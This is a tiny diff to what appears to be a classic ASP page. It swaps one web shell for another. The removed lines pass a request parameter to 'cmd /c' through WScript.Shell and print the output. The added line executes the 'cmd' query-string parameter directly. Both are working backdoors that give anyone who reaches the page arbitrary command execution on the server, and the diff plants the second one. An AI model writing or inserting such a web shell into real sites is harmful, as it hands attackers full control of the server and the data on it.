@@ -1,3 +1,1 @@
-<%
-Response.write(CreateObject("WScript.Shell").Exec("cmd /c " + request("x")).StdOut.Readall());
-%>
+<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
